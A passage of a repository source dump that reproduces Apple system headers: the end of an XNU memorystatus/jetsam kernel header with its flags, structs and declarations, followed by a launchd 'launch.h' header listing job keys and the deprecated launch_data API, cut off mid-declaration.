#define MEMORYSTATUS_CMD_GET_AGGRESSIVE_JETSAM_LENIENT_MODE      21   /* Query if the lenient mode for aggressive jetsam is enabled. */

#define MEMORYSTATUS_CMD_INCREASE_JETSAM_TASK_LIMIT   22   /* Used by DYLD to increase the jetsam active and inactive limits, when using roots */

#if PRIVATE
#define MEMORYSTATUS_CMD_SET_TESTING_PID 23 /* Used by unit tests in the development kernel only. */
#endif /* PRIVATE */

#define MEMORYSTATUS_CMD_GET_PROCESS_IS_FROZEN 24 /* Check if the process is frozen. */

/* Commands that act on a group of processes */
#define MEMORYSTATUS_CMD_GRP_SET_PROPERTIES           100

#if PRIVATE
/* Test commands */

/* Trigger forced jetsam */
#define MEMORYSTATUS_CMD_TEST_JETSAM            1000
#define MEMORYSTATUS_CMD_TEST_JETSAM_SORT       1001

/* Panic on jetsam options */
typedef struct memorystatus_jetsam_panic_options {
	uint32_t data;
	uint32_t mask;
} memorystatus_jetsam_panic_options_t;

#define MEMORYSTATUS_CMD_SET_JETSAM_PANIC_BITS        1002

/* Select priority band sort order */
#define JETSAM_SORT_NOSORT      0
#define JETSAM_SORT_DEFAULT     1

#endif /* PRIVATE */

/* memorystatus_control() flags */

#define MEMORYSTATUS_FLAGS_SNAPSHOT_ON_DEMAND           0x1     /* A populated snapshot buffer is returned on demand */
#define MEMORYSTATUS_FLAGS_SNAPSHOT_AT_BOOT             0x2     /* Returns a snapshot with memstats collected at boot */
#define MEMORYSTATUS_FLAGS_SNAPSHOT_COPY                0x4     /* Returns the previously populated snapshot created by the system */
#define MEMORYSTATUS_FLAGS_GRP_SET_PRIORITY             0x8     /* Set jetsam priorities for a group of pids */
#define MEMORYSTATUS_FLAGS_GRP_SET_PROBABILITY          0x10    /* Set probability of use for a group of processes */

#if PRIVATE
#define MEMORYSTATUS_FLAGS_SET_TESTING_PID     0x20 /* Only used by xnu unit tests. */
#define MEMORYSTATUS_FLAGS_UNSET_TESTING_PID   0x40 /* Only used by xnu unit tests. */
#endif /* PRIVATE */

#define MEMORYSTATUS_FLAGS_SNAPSHOT_FREEZER             0x80    /* A snapshot buffer containing app kills since last consumption */
/*
 * For use with memorystatus_control:
 * MEMORYSTATUS_CMD_GET_JETSAM_SNAPSHOT
 *
 * A jetsam snapshot is initialized when a non-idle
 * jetsam event occurs.  The data is held in the
 * buffer until it is reaped. This is the default
 * behavior.
 *
 * Flags change the default behavior:
 *	Demand mode - this is an on_demand snapshot,
 *	meaning data is populated upon request.
 *
 *	Boot mode - this is a snapshot of
 *	memstats collected before loading the
 *	init program.  Once collected, these
 *	stats do not change.  In this mode,
 *	the snapshot entry_count is always 0.
 *
 *	Copy mode - this returns the previous snapshot
 *      collected by the system. The current snaphshot
 *	might be only half populated.
 *
 * Snapshots are inherently racey between request
 * for buffer size and actual data compilation.
 */

/* These definitions are required for backwards compatibility */
#define MEMORYSTATUS_SNAPSHOT_ON_DEMAND         MEMORYSTATUS_FLAGS_SNAPSHOT_ON_DEMAND
#define MEMORYSTATUS_SNAPSHOT_AT_BOOT           MEMORYSTATUS_FLAGS_SNAPSHOT_AT_BOOT
#define MEMORYSTATUS_SNAPSHOT_COPY              MEMORYSTATUS_FLAGS_SNAPSHOT_COPY

/*
 * For use with memorystatus_control:
 * MEMORYSTATUS_CMD_SET_PRIORITY_PROPERTIES
 */
typedef struct memorystatus_priority_properties {
	int32_t  priority;
	uint64_t user_data;
} memorystatus_priority_properties_t;

/*
 * Inform the kernel that setting the priority property is driven by assertions.
 */
#define MEMORYSTATUS_SET_PRIORITY_ASSERTION     0x1

/*
 * For use with memorystatus_control:
 * MEMORYSTATUS_CMD_SET_MEMLIMIT_PROPERTIES
 * MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES
 */
typedef struct memorystatus_memlimit_properties {
	int32_t memlimit_active;                /* jetsam memory limit (in MB) when process is active */
	uint32_t memlimit_active_attr;
	int32_t memlimit_inactive;              /* jetsam memory limit (in MB) when process is inactive */
	uint32_t memlimit_inactive_attr;
} memorystatus_memlimit_properties_t;

typedef struct memorystatus_memlimit_properties2 {
	memorystatus_memlimit_properties_t v1;
	uint32_t memlimit_increase;             /* jetsam memory limit increase (in MB) for active and inactive states */
	uint32_t memlimit_increase_bytes;       /* bytes used to determine the jetsam memory limit increase, for active and inactive states */
} memorystatus_memlimit_properties2_t;

#define MEMORYSTATUS_MEMLIMIT_ATTR_FATAL        0x1     /* if set, exceeding the memlimit is fatal */

#ifdef XNU_KERNEL_PRIVATE

/*
 * A process will be killed immediately if it crosses a memory limit marked as fatal.
 * Fatal limit types are the
 *	- default system-wide task limit
 *	- per-task custom memory limit
 *
 * A process with a non-fatal memory limit can exceed that limit, but becomes an early
 * candidate for jetsam when the device is under memory pressure.
 * Non-fatal limit types are the
 *	- high-water-mark limit
 *
 * Processes that opt into dirty tracking are evaluated
 * based on clean vs dirty state.
 *      dirty ==> active
 *      clean ==> inactive
 *
 * Processes that do not opt into dirty tracking are
 * evalulated based on priority level.
 *      Foreground or above ==> active
 *      Below Foreground    ==> inactive
 */

/*
 * p_memstat_state flag holds
 *	- in kernel process state and memlimit state
 */

#define P_MEMSTAT_SUSPENDED            0x00000001 /* Process is suspended and likely in the IDLE band */
#define P_MEMSTAT_FROZEN               0x00000002 /* Process has some state on disk. It should be suspended */
#define P_MEMSTAT_FREEZE_DISABLED      0x00000004 /* Process isn't freeze-eligible and will not be frozen */
#define P_MEMSTAT_ERROR                0x00000008 /* Process couldn't be jetsammed for some reason. Transient state so jetsam can skip it next time it sees it */
#define P_MEMSTAT_LOCKED               0x00000010 /* Process is being actively worked on behind the proc_list_lock */
#define P_MEMSTAT_TERMINATED           0x00000020 /* Process is exiting */
#define P_MEMSTAT_FREEZE_IGNORE        0x00000040 /* Process was evaluated by freezer and will be ignored till the next time it goes active and does something */
#define P_MEMSTAT_PRIORITYUPDATED      0x00000080 /* Process had its jetsam priority updated */
#define P_MEMSTAT_FOREGROUND           0x00000100 /* Process is in the FG jetsam band...unused??? */
#define P_MEMSTAT_REFREEZE_ELIGIBLE    0x00000400 /* Process was once thawed i.e. its state was brought back from disk. It is now refreeze eligible.*/
#define P_MEMSTAT_MANAGED              0x00000800 /* Process is managed by assertiond i.e. is either application or extension */
#define P_MEMSTAT_INTERNAL             0x00001000 /* Process is a system-critical-not-be-jetsammed process i.e. launchd */
#define P_MEMSTAT_FATAL_MEMLIMIT                  0x00002000   /* current fatal state of the process's memlimit */
#define P_MEMSTAT_MEMLIMIT_ACTIVE_FATAL           0x00004000   /* if set, exceeding limit is fatal when the process is active   */
#define P_MEMSTAT_MEMLIMIT_INACTIVE_FATAL         0x00008000   /* if set, exceeding limit is fatal when the process is inactive */
#define P_MEMSTAT_USE_ELEVATED_INACTIVE_BAND      0x00010000   /* if set, the process will go into this band & stay there when in the background instead
	                                                        *  of the aging bands and/or the IDLE band. */
#define P_MEMSTAT_PRIORITY_ASSERTION              0x00020000   /* jetsam priority is being driven by an assertion */
#define P_MEMSTAT_FREEZE_CONSIDERED               0x00040000   /* This process has been considered for the freezer. */

/*
 * p_memstat_relaunch_flags holds
 *      - relaunch behavior when jetsammed
 */
#define P_MEMSTAT_RELAUNCH_UNKNOWN      0x0
#define P_MEMSTAT_RELAUNCH_LOW          0x1
#define P_MEMSTAT_RELAUNCH_MED          0x2
#define P_MEMSTAT_RELAUNCH_HIGH         0x4

/*
 * Checking the p_memstat_state almost always requires the proc_list_lock
 * because the jetsam thread could be on the other core changing the state.
 *
 * App -- almost always managed by a system process. Always have dirty tracking OFF. Can include extensions too.
 * System Processes -- not managed by anybody. Always have dirty tracking ON. Can include extensions (here) too.
 */
#define isApp(p)            ((p->p_memstat_state & P_MEMSTAT_MANAGED) || ! (p->p_memstat_dirty & P_DIRTY_TRACK))
#define isSysProc(p)            ( ! (p->p_memstat_state & P_MEMSTAT_MANAGED) || (p->p_memstat_dirty & P_DIRTY_TRACK))

#define MEMSTAT_BUCKET_COUNT (JETSAM_PRIORITY_MAX + 1)

typedef struct memstat_bucket {
	TAILQ_HEAD(, proc) list;
	int count;
	int relaunch_high_count;
} memstat_bucket_t;

extern memstat_bucket_t memstat_bucket[MEMSTAT_BUCKET_COUNT];

/*
 * Table that expresses the probability of a process
 * being used in the next hour.
 */
typedef struct memorystatus_internal_probabilities {
	char proc_name[MAXCOMLEN + 1];
	int use_probability;
} memorystatus_internal_probabilities_t;

extern memorystatus_internal_probabilities_t *memorystatus_global_probabilities_table;
extern size_t memorystatus_global_probabilities_size;


extern void memorystatus_init(void);

extern void memorystatus_init_at_boot_snapshot(void);

extern int memorystatus_add(proc_t p, boolean_t locked);
extern int memorystatus_update(proc_t p, int priority, uint64_t user_data, boolean_t is_assertion, boolean_t effective,
    boolean_t update_memlimit, int32_t memlimit_active, boolean_t memlimit_active_is_fatal,
    int32_t memlimit_inactive, boolean_t memlimit_inactive_is_fatal);

/* Remove this process from jetsam bands for killing or freezing.
 * The proc_list_lock is held by the caller.
 * @param p: The process to remove.
 * @return: 0 if successful. EAGAIN if the process can't be removed right now (because it's being frozen) or ESRCH.
 */
extern int memorystatus_remove(proc_t p);

int memorystatus_update_inactive_jetsam_priority_band(pid_t pid, uint32_t opflags, int priority, boolean_t effective_now);
int memorystatus_relaunch_flags_update(proc_t p, int relaunch_flags);

extern int memorystatus_dirty_track(proc_t p, uint32_t pcontrol);
extern int memorystatus_dirty_set(proc_t p, boolean_t self, uint32_t pcontrol);
extern int memorystatus_dirty_get(proc_t p, boolean_t locked);
extern int memorystatus_dirty_clear(proc_t p, uint32_t pcontrol);

extern int memorystatus_on_terminate(proc_t p);

extern void memorystatus_on_suspend(proc_t p);
extern void memorystatus_on_resume(proc_t p);
extern void memorystatus_on_inactivity(proc_t p);

extern void memorystatus_on_pageout_scan_end(void);

/* Memorystatus kevent */

void memorystatus_kevent_init(lck_grp_t *grp, lck_attr_t *attr);

int memorystatus_knote_register(struct knote *kn);
void memorystatus_knote_unregister(struct knote *kn);

#if CONFIG_MEMORYSTATUS
void memorystatus_log_exception(const int max_footprint_mb, boolean_t memlimit_is_active, boolean_t memlimit_is_fatal);
void memorystatus_on_ledger_footprint_exceeded(int warning, boolean_t memlimit_is_active, boolean_t memlimit_is_fatal);
void proc_memstat_terminated(proc_t p, boolean_t set);
void memorystatus_proc_flags_unsafe(void * v, boolean_t *is_dirty, boolean_t *is_dirty_tracked, boolean_t *allow_idle_exit);

#if __arm64__
void memorystatus_act_on_legacy_footprint_entitlement(proc_t p, boolean_t footprint_increase);
void memorystatus_act_on_ios13extended_footprint_entitlement(proc_t p);
void memorystatus_act_on_entitled_task_limit(proc_t p);
#endif /* __arm64__ */

#endif /* CONFIG_MEMORYSTATUS */

int memorystatus_get_pressure_status_kdp(void);

#if CONFIG_JETSAM

typedef enum memorystatus_policy {
	kPolicyDefault        = 0x0,
	kPolicyMoreFree       = 0x1,
} memorystatus_policy_t;

boolean_t memorystatus_kill_on_VM_page_shortage(boolean_t async);
boolean_t memorystatus_kill_on_FC_thrashing(boolean_t async);
boolean_t memorystatus_kill_on_VM_compressor_thrashing(boolean_t async);
boolean_t memorystatus_kill_on_vnode_limit(void);

void jetsam_on_ledger_cpulimit_exceeded(void);
void memorystatus_fast_jetsam_override(boolean_t enable_override);

#endif /* CONFIG_JETSAM */

/* These are very verbose printfs(), enable with
 * MEMORYSTATUS_DEBUG_LOG
 */
#if MEMORYSTATUS_DEBUG_LOG
#define MEMORYSTATUS_DEBUG(cond, format, ...)      \
do {                                              \
if (cond) { printf(format, ##__VA_ARGS__); } \
} while(0)
#else
#define MEMORYSTATUS_DEBUG(cond, format, ...)
#endif

boolean_t memorystatus_kill_on_zone_map_exhaustion(pid_t pid);
boolean_t memorystatus_kill_on_VM_compressor_space_shortage(boolean_t async);
void memorystatus_pages_update(unsigned int pages_avail);
boolean_t memorystatus_idle_exit_from_VM(void);
proc_t memorystatus_get_first_proc_locked(unsigned int *bucket_index, boolean_t search);
proc_t memorystatus_get_next_proc_locked(unsigned int *bucket_index, proc_t p, boolean_t search);
void memorystatus_get_task_page_counts(task_t task, uint32_t *footprint, uint32_t *max_footprint_lifetime, uint32_t *purgeable_pages);
void memorystatus_invalidate_idle_demotion_locked(proc_t p, boolean_t clean_state);
void memorystatus_update_priority_locked(proc_t p, int priority, boolean_t head_insert, boolean_t skip_demotion_check);

#if VM_PRESSURE_EVENTS

extern kern_return_t memorystatus_update_vm_pressure(boolean_t);

#if CONFIG_MEMORYSTATUS
/* Flags */
extern int memorystatus_low_mem_privileged_listener(uint32_t op_flags);
extern int memorystatus_send_pressure_note(int pid);
extern boolean_t memorystatus_is_foreground_locked(proc_t p);
extern boolean_t memorystatus_bg_pressure_eligible(proc_t p);
#endif /* CONFIG_MEMORYSTATUS */

#endif /* VM_PRESSURE_EVENTS */

#endif /* XNU_KERNEL_PRIVATE */

#endif /* SYS_MEMORYSTATUS_H */

```

`BaseBin/_external/include/launch.h`:

```h
#ifndef __XPC_LAUNCH_H__
#define __XPC_LAUNCH_H__

/*!
 * @header
 * These interfaces were only ever documented for the purpose of allowing a
 * launchd job to obtain file descriptors associated with the sockets it
 * advertised in its launchd.plist(5). That functionality is now available in a
 * much more straightforward fashion through the {@link launch_activate_socket}
 * API.
 *
 * There are currently no replacements for other uses of the {@link launch_msg}
 * API, including submitting, removing, starting, stopping and listing jobs.
 */

#include <os/base.h>
#include <Availability.h>

#include <mach/mach.h>
#include <stddef.h>
#include <stdbool.h>
#include <sys/cdefs.h>

#if __has_feature(assume_nonnull)
_Pragma("clang assume_nonnull begin")
#endif
__BEGIN_DECLS

#define LAUNCH_KEY_SUBMITJOB "SubmitJob"
#define LAUNCH_KEY_REMOVEJOB "RemoveJob"
#define LAUNCH_KEY_STARTJOB "StartJob"
#define LAUNCH_KEY_STOPJOB "StopJob"
#define LAUNCH_KEY_GETJOB "GetJob"
#define LAUNCH_KEY_GETJOBS "GetJobs"
#define LAUNCH_KEY_CHECKIN "CheckIn"

#define LAUNCH_JOBKEY_LABEL "Label"
#define LAUNCH_JOBKEY_DISABLED "Disabled"
#define LAUNCH_JOBKEY_USERNAME "UserName"
#define LAUNCH_JOBKEY_GROUPNAME "GroupName"
#define LAUNCH_JOBKEY_TIMEOUT "TimeOut"
#define LAUNCH_JOBKEY_EXITTIMEOUT "ExitTimeOut"
#define LAUNCH_JOBKEY_INITGROUPS "InitGroups"
#define LAUNCH_JOBKEY_SOCKETS "Sockets"
#define LAUNCH_JOBKEY_MACHSERVICES "MachServices"
#define LAUNCH_JOBKEY_MACHSERVICELOOKUPPOLICIES "MachServiceLookupPolicies"
#define LAUNCH_JOBKEY_INETDCOMPATIBILITY "inetdCompatibility"
#define LAUNCH_JOBKEY_ENABLEGLOBBING "EnableGlobbing"
#define LAUNCH_JOBKEY_PROGRAMARGUMENTS "ProgramArguments"
#define LAUNCH_JOBKEY_PROGRAM "Program"
#define LAUNCH_JOBKEY_ONDEMAND "OnDemand"
#define LAUNCH_JOBKEY_KEEPALIVE "KeepAlive"
#define LAUNCH_JOBKEY_LIMITLOADTOHOSTS "LimitLoadToHosts"
#define LAUNCH_JOBKEY_LIMITLOADFROMHOSTS "LimitLoadFromHosts"
#define LAUNCH_JOBKEY_LIMITLOADTOSESSIONTYPE "LimitLoadToSessionType"
#define LAUNCH_JOBKEY_LIMITLOADTOHARDWARE "LimitLoadToHardware"
#define LAUNCH_JOBKEY_LIMITLOADFROMHARDWARE "LimitLoadFromHardware"
#define LAUNCH_JOBKEY_RUNATLOAD "RunAtLoad"
#define LAUNCH_JOBKEY_ROOTDIRECTORY "RootDirectory"
#define LAUNCH_JOBKEY_WORKINGDIRECTORY "WorkingDirectory"
#define LAUNCH_JOBKEY_ENVIRONMENTVARIABLES "EnvironmentVariables"
#define LAUNCH_JOBKEY_USERENVIRONMENTVARIABLES "UserEnvironmentVariables"
#define LAUNCH_JOBKEY_UMASK "Umask"
#define LAUNCH_JOBKEY_NICE "Nice"
#define LAUNCH_JOBKEY_HOPEFULLYEXITSFIRST "HopefullyExitsFirst"
#define LAUNCH_JOBKEY_HOPEFULLYEXITSLAST "HopefullyExitsLast"
#define LAUNCH_JOBKEY_LOWPRIORITYIO "LowPriorityIO"
#define LAUNCH_JOBKEY_LOWPRIORITYBACKGROUNDIO "LowPriorityBackgroundIO"
#define LAUNCH_JOBKEY_MATERIALIZEDATALESSFILES "MaterializeDatalessFiles"
#define LAUNCH_JOBKEY_SESSIONCREATE "SessionCreate"
#define LAUNCH_JOBKEY_STARTONMOUNT "StartOnMount"
#define LAUNCH_JOBKEY_SOFTRESOURCELIMITS "SoftResourceLimits"
#define LAUNCH_JOBKEY_HARDRESOURCELIMITS "HardResourceLimits"
#define LAUNCH_JOBKEY_STANDARDINPATH "StandardInPath"
#define LAUNCH_JOBKEY_STANDARDOUTPATH "StandardOutPath"
#define LAUNCH_JOBKEY_STANDARDERRORPATH "StandardErrorPath"
#define LAUNCH_JOBKEY_DEBUG "Debug"
#define LAUNCH_JOBKEY_WAITFORDEBUGGER "WaitForDebugger"
#define LAUNCH_JOBKEY_QUEUEDIRECTORIES "QueueDirectories"
#define LAUNCH_JOBKEY_HOMERELATIVEQUEUEDIRECTORIES "HomeRelativeQueueDirectories"
#define LAUNCH_JOBKEY_WATCHPATHS "WatchPaths"
#define LAUNCH_JOBKEY_STARTINTERVAL "StartInterval"
#define LAUNCH_JOBKEY_STARTCALENDARINTERVAL "StartCalendarInterval"
#define LAUNCH_JOBKEY_BONJOURFDS "BonjourFDs"
#define LAUNCH_JOBKEY_LASTEXITSTATUS "LastExitStatus"
#define LAUNCH_JOBKEY_PID "PID"
#define LAUNCH_JOBKEY_THROTTLEINTERVAL "ThrottleInterval"
#define LAUNCH_JOBKEY_LAUNCHONLYONCE "LaunchOnlyOnce"
#define LAUNCH_JOBKEY_ABANDONPROCESSGROUP "AbandonProcessGroup"
#define LAUNCH_JOBKEY_IGNOREPROCESSGROUPATSHUTDOWN \
	"IgnoreProcessGroupAtShutdown"
#define LAUNCH_JOBKEY_LEGACYTIMERS "LegacyTimers"
#define LAUNCH_JOBKEY_ENABLEPRESSUREDEXIT "EnablePressuredExit"
#define LAUNCH_JOBKEY_ENABLETRANSACTIONS "EnableTransactions"
#define LAUNCH_JOBKEY_DRAINMESSAGESONFAILEDINIT "DrainMessagesOnFailedInit"
#define LAUNCH_JOBKEY_POLICIES "Policies"
#define LAUNCH_JOBKEY_BUNDLEPROGRAM "BundleProgram"
#define LAUNCH_JOBKEY_ASSOCIATEDBUNDLEIDENTIFIERS "AssociatedBundleIdentifiers"

#define LAUNCH_JOBKEY_PUBLISHESEVENTS "PublishesEvents"
#define LAUNCH_KEY_PUBLISHESEVENTS_DOMAININTERNAL "DomainInternal"

#define LAUNCH_JOBPOLICY_DENYCREATINGOTHERJOBS "DenyCreatingOtherJobs"

#define LAUNCH_JOBINETDCOMPATIBILITY_WAIT "Wait"
#define LAUNCH_JOBINETDCOMPATIBILITY_INSTANCES "Instances"

#define LAUNCH_JOBKEY_MACH_RESETATCLOSE "ResetAtClose"
#define LAUNCH_JOBKEY_MACH_HIDEUNTILCHECKIN "HideUntilCheckIn"

#define LAUNCH_JOBKEY_KEEPALIVE_SUCCESSFULEXIT "SuccessfulExit"
#define LAUNCH_JOBKEY_KEEPALIVE_NETWORKSTATE "NetworkState"
#define LAUNCH_JOBKEY_KEEPALIVE_PATHSTATE "PathState"
#define LAUNCH_JOBKEY_KEEPALIVE_HOMERELATIVEPATHSTATE "HomeRelativePathState"
#define LAUNCH_JOBKEY_KEEPALIVE_OTHERJOBACTIVE "OtherJobActive"
#define LAUNCH_JOBKEY_KEEPALIVE_OTHERJOBENABLED "OtherJobEnabled"
#define LAUNCH_JOBKEY_KEEPALIVE_AFTERINITIALDEMAND	"AfterInitialDemand"
#define LAUNCH_JOBKEY_KEEPALIVE_CRASHED "Crashed"

#define LAUNCH_JOBKEY_LAUNCHEVENTS "LaunchEvents"

#define LAUNCH_JOBKEY_CAL_MINUTE "Minute"
#define LAUNCH_JOBKEY_CAL_HOUR "Hour"
#define LAUNCH_JOBKEY_CAL_DAY "Day"
#define LAUNCH_JOBKEY_CAL_WEEKDAY "Weekday"
#define LAUNCH_JOBKEY_CAL_MONTH "Month"

#define LAUNCH_JOBKEY_RESOURCELIMIT_CORE "Core"
#define LAUNCH_JOBKEY_RESOURCELIMIT_CPU "CPU"
#define LAUNCH_JOBKEY_RESOURCELIMIT_DATA "Data"
#define LAUNCH_JOBKEY_RESOURCELIMIT_FSIZE "FileSize"
#define LAUNCH_JOBKEY_RESOURCELIMIT_MEMLOCK "MemoryLock"
#define LAUNCH_JOBKEY_RESOURCELIMIT_NOFILE "NumberOfFiles"
#define LAUNCH_JOBKEY_RESOURCELIMIT_NPROC "NumberOfProcesses"
#define LAUNCH_JOBKEY_RESOURCELIMIT_RSS "ResidentSetSize"
#define LAUNCH_JOBKEY_RESOURCELIMIT_STACK "Stack"

#define LAUNCH_JOBKEY_DISABLED_MACHINETYPE "MachineType"
#define LAUNCH_JOBKEY_DISABLED_MODELNAME "ModelName"

#define LAUNCH_JOBKEY_DATASTORES "Datastores"
#define LAUNCH_JOBKEY_DATASTORES_SIZELIMIT "SizeLimit"

#define LAUNCH_JOBSOCKETKEY_TYPE "SockType"
#define LAUNCH_JOBSOCKETKEY_PASSIVE "SockPassive"
#define LAUNCH_JOBSOCKETKEY_BONJOUR "Bonjour"
#define LAUNCH_JOBSOCKETKEY_SECUREWITHKEY "SecureSocketWithKey"
#define LAUNCH_JOBSOCKETKEY_PATHNAME "SockPathName"
#define LAUNCH_JOBSOCKETKEY_PATHMODE "SockPathMode"
#define LAUNCH_JOBSOCKETKEY_PATHOWNER "SockPathOwner"
#define LAUNCH_JOBSOCKETKEY_PATHGROUP "SockPathGroup"
#define LAUNCH_JOBSOCKETKEY_NODENAME "SockNodeName"
#define LAUNCH_JOBSOCKETKEY_SERVICENAME "SockServiceName"
#define LAUNCH_JOBSOCKETKEY_FAMILY "SockFamily"
#define LAUNCH_JOBSOCKETKEY_PROTOCOL "SockProtocol"
#define LAUNCH_JOBSOCKETKEY_MULTICASTGROUP "MulticastGroup"

#define LAUNCH_JOBKEY_PROCESSTYPE "ProcessType"
#define LAUNCH_KEY_PROCESSTYPE_APP "App"
#define LAUNCH_KEY_PROCESSTYPE_STANDARD "Standard"
#define LAUNCH_KEY_PROCESSTYPE_BACKGROUND "Background"
#define LAUNCH_KEY_PROCESSTYPE_INTERACTIVE "Interactive"
#define LAUNCH_KEY_PROCESSTYPE_ADAPTIVE "Adaptive"

/*!
 * @function launch_activate_socket
 *
 * @abstract
 * Retrieves the file descriptors for sockets specified in the process'
 * launchd.plist(5).
 *
 * @param name
 * The name of the socket entry in the service's Sockets dictionary.
 *
 * @param fds
 * On return, this parameter will be populated with an array of file
 * descriptors. One socket can have many descriptors associated with it
 * depending on the characteristics of the network interfaces on the system.
 * The descriptors in this array are the results of calling getaddrinfo(3) with
 * the parameters described in launchd.plist(5).
 *
 * The caller is responsible for calling free(3) on the returned pointer.
 *
 * @param cnt
 * The number of file descriptor entries in the returned array.
 *
 * @result
 * On success, zero is returned. Otherwise, an appropriate POSIX-domain is
 * returned. Possible error codes are:
 *
 * ENOENT -> There was no socket of the specified name owned by the caller.
 * ESRCH -> The caller is not a process managed by launchd.
 * EALREADY -> The socket has already been activated by the caller.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_10, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1 OS_NONNULL2 OS_NONNULL3
int
launch_activate_socket(const char *name,
	int * _Nonnull * _Nullable fds, size_t *cnt);

typedef struct _launch_data *launch_data_t;
typedef void (*launch_data_dict_iterator_t)(const launch_data_t lval,
	const char *key, void * _Nullable ctx);

typedef enum {
	LAUNCH_DATA_DICTIONARY = 1,
	LAUNCH_DATA_ARRAY,
	LAUNCH_DATA_FD,
	LAUNCH_DATA_INTEGER,
	LAUNCH_DATA_REAL,
	LAUNCH_DATA_BOOL,
	LAUNCH_DATA_STRING,
	LAUNCH_DATA_OPAQUE,
	LAUNCH_DATA_ERRNO,
	LAUNCH_DATA_MACHPORT,
} launch_data_type_t;

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_alloc(launch_data_type_t type);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT OS_NONNULL1
launch_data_t
launch_data_copy(launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
launch_data_type_t
launch_data_get_type(const launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
void
launch_data_free(launch_data_t ld);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1 OS_NONNULL2 OS_NONNULL3
bool
launch_data_dict_insert(launch_data_t ldict, const launch_data_t lval,
	const char *key);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1 OS_NONNULL2
launch_data_t _Nullable
launch_data_dict_lookup(const launch_data_t ldict, const char *key);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1 OS_NONNULL2
bool
launch_data_dict_remove(launch_data_t ldict, const char *key);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1 OS_NONNULL2
void
launch_data_dict_iterate(const launch_data_t ldict,
	launch_data_dict_iterator_t iterator, void * _Nullable ctx);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
size_t
launch_data_dict_get_count(const launch_data_t ldict);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1 OS_NONNULL2
bool
launch_data_array_set_index(launch_data_t larray, const launch_data_t lval,
	size_t idx);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
launch_data_t
launch_data_array_get_index(const launch_data_t larray, size_t idx);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_WARN_RESULT OS_NONNULL1
size_t
launch_data_array_get_count(const launch_data_t larray);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_fd(int fd);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_machport(mach_port_t val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_integer(long long val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_bool(bool val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_real(double val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_string(const char *val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_MALLOC OS_WARN_RESULT
launch_data_t
launch_data_new_opaque(const void *bytes, size_t sz);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
bool
launch_data_set_fd(launch_data_t ld, int fd);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
bool
launch_data_set_machport(launch_data_t ld, mach_port_t mp);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
OS_EXPORT OS_NONNULL1
bool
launch_data_set_integer(launch_data_t ld, long long val);

__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_4, __MAC_10_10, __IPHONE_2_0, __IPHONE_8_0)
